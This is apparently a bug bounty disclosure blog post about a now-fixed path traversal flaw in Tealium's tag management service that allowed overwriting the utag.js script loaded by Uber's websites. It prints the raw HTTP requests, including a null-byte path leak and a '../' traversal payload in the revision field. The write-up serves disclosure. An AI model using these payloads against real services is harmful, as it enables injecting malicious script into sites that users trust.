---
layout: post
title: Hijack the JS File of Uber's Website
categories: articles
---

<p align="right" class="date">{{ page.date | date_to_string }} - zhchbin</p>

&nbsp;&nbsp;&nbsp;Again, sorry for my poor English first of all, and I will try my best to describe this bug bounty report throughly.

## TLDR

1. Almost all of Uber’s websites are loading JS file: https://tags.tiqcdn.com/utag/uber/main/prod/utag.js
2. I found that the content of utag.js is updating from `/data/utui/data/accounts/uber/templates/main/utag.js` when deploying in my.tealiumiq.com.
3. my.tealiumiq.com has a path traversal issue, which allow hacker to change `utag.js` of other account, including Uber’s.
4. This bug had beed fixed 8 months ago. Bug Bounty: $6000.

## My Steps

I like asking myself some questions when hunting for bug bounty. Looking around about `https://tags.tiqcdn.com/utag/uber/main/prod/utag.js`, I found Uber’s websites were using a third party service offered by Tealium. I asked myself: can I modify the content of `utag.js`? How?

I registered two account and began my journey. WARNING: DO NOT TEST IN PRODUCTION USING TARGET ACCOUNT.

<img src="https://ws1.sinaimg.cn/large/7184df6bgy1fxtifofrypj20gh0bq0tw.jpg">

* Post `/urest/legacy/saveTemplate` with `profile=main%00` to get the path in server

{% highlight javascript %}
POST /urest/legacy/saveTemplate?utk=044925f62222711fdfec11dc6a4e7160e053d31e1a7f4774e8 HTTP/1.1
Host: my.tealiumiq.com
<redated>

account=evilaccount&profile=main%00&type=profile&template=profile.loader&code=%2F%2F+console.log(1)%3B%0A%0Aconsole.log(1)%3B
{% endhighlight %}

Response

{% highlight javascript %}
{ "message" : "There was an error updating this template: /data/utui/data/accounts/evilaccount/templates/main/utag.js"}
{% endhighlight %}

As you can see, the `utag.loader` template path is `/data/utui/data/accounts/evilaccount/templates/main/utag.js`

* Change the requst body to update the revision.loader

{% highlight javascript %}
POST /urest/legacy/saveTemplate?utk=688b137d1b8d8e884b3e1be4cd689843d0e3bc9705665f059b HTTP/1.1

account=evilaccount&profile=main%00&type=revision&template=revision.loader&code=thisisatest&revision=201804081230
{% endhighlight %}

Response

{% highlight javascript %}
{ "message" : "There was an error updating this template: /data/utui/data/accounts/evilaccount/templates/main/201804081230/utag.js"}
{% endhighlight %}

As you can see `201804081230` is appearing at the path. After testing, I found that I can insert `../` into this path, which means that I can change utag.js of any account, including Uber’s.

{% highlight javascript %}
POST /urest/legacy/saveTemplate?utk=688b137d1b8d8e884b3e1be4cd689843d0e3bc9705665f059b HTTP/1.1
...

account=evilaccount&profile=main&type=revision&template=revision.loader&code=thisisatest&revision=201804081230/../../../../<victimaccount>/templates/main
{% endhighlight %}
